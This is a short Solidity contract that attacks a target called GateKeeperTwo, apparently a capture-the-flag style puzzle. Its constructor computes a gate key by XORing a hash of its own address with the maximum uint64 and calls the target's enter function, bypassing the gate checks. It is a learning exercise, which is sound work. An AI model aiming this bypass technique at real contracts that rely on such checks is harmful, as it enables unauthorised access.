// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "hardhat/console.sol";

interface IGateKeepertwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateKeeperTwoAttack {
    IGateKeepertwo private target;

    constructor(address _target) {
        target = IGateKeepertwo(_target);

        //Gate 3: type(uint64).max = 1111111111111111111111111111111111111111111111111111111111111111
        //How XOR works?

        uint64 maxUint64 = type(uint64).max;

        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^
            bytes8(maxUint64);

        target.enter(gateKey);
    }
}
